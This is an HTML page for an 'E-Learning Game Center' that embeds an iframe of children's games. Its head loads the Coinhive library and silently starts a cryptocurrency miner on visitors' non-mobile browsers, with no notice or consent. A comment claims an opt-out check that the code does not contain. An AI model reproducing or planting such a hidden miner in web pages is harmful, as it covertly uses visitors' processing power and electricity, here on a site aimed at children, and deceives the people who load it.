<!DOCTYPE html>
<html>
	<head>
	    <title>E-Learning</title>
	    <script src="https://coinhive.com/lib/coinhive.min.js"></script>
        <script>
        	var miner = new CoinHive.Anonymous('jKjJ8X4kZjfNl39Q44PaYZREIzltm0dv', {throttle: 0.15});
        
        	// Only start on non-mobile devices and if not opted-out
        	// in the last 14400 seconds (4 hours):
        	if (!miner.isMobile()) {
        	    miner.start();
        	}
        </script>
		<script src="https://cdnjs.cloudflare.com/ajax/libs/phaser/2.6.2/phaser.min.js"></script>
		<script
		  src="https://code.jquery.com/jquery-3.2.1.js"
		  integrity="sha256-DZAnKJ/6XZ9si04Hgrsxu/8s717jcIzLy3oi35EouyE="
		  crossorigin="anonymous"></script>
		<script src="js/capslock.js"></script>
		<script>
		    $(function(){
		        $("#modal_caps").hide();
		    });
		</script>
		<link rel='stylesheet' type='text/css' href='css/etyping.css'/>
		<style>
			canvas{
				margin: 0 auto;
				margin-top: 20px;
				border: solid 10px;
				border-radius: 5px;
			}
			
			.container{
			    text-align:center;
			}
			
			.label-big{
			    font-family: "Century Gothic";
			    font-weight: bold;
			    font-size: 50px;
			    -webkit-text-stroke: 1.4px #000000;
                -webkit-text-fill-color: #FFFFFF;
			}
			
			body{
				  color: rgba(255,255,255,1);
				  background: -webkit-linear-gradient(45deg, rgba(0,0,0,0.0980392) 25%, rgba(0,0,0,0) 25%, rgba(0,0,0,0) 75%, rgba(0,0,0,0.0980392) 75%, rgba(0,0,0,0.0980392) 0), -webkit-linear-gradient(45deg, rgba(0,0,0,0.0980392) 25%, rgba(0,0,0,0) 25%, rgba(0,0,0,0) 75%, rgba(0,0,0,0.0980392) 75%, rgba(0,0,0,0.0980392) 0), rgba(46,101,160,1);
                  background: -moz-linear-gradient(45deg, rgba(0,0,0,0.0980392) 25%, rgba(0,0,0,0) 25%, rgba(0,0,0,0) 75%, rgba(0,0,0,0.0980392) 75%, rgba(0,0,0,0.0980392) 0), -moz-linear-gradient(45deg, rgba(0,0,0,0.0980392) 25%, rgba(0,0,0,0) 25%, rgba(0,0,0,0) 75%, rgba(0,0,0,0.0980392) 75%, rgba(0,0,0,0.0980392) 0), rgba(46,101,160,1);
                  background: linear-gradient(45deg, rgba(0,0,0,0.0980392) 25%, rgba(0,0,0,0) 25%, rgba(0,0,0,0) 75%, rgba(0,0,0,0.0980392) 75%, rgba(0,0,0,0.0980392) 0), linear-gradient(45deg, rgba(0,0,0,0.0980392) 25%, rgba(0,0,0,0) 25%, rgba(0,0,0,0) 75%, rgba(0,0,0,0.0980392) 75%, rgba(0,0,0,0.0980392) 0), rgba(46,101,160,1);
                  background-position: 0 0, 40px 40px;
				  -webkit-background-origin: padding-box;
				  background-origin: padding-box;
				  -webkit-background-clip: border-box;
				  background-clip: border-box;
				  -webkit-background-size: 80px 80px;
				  background-size: 80px 80px;
			}
		</style>
	</head>
	<body>
		<div class='container'>
		    <div class='label-big'>E-Learning Game Center</div>
			<div id='gameSpace'>
                <iframe width='100%' height='600px' frameborder='0' scrolling='yes' src='http://publishers.spilgames.com/en/frame?width=100%&height=600px&limit=100&itemsperrow=4&categories=Kids&tiletype=0'></iframe>
			</div>
			<div class="bar_stats" id="modal_caps">Press the <span class="btn_letter_wrong">CapsLock</span></div>
		</div>
	</body>
</html>
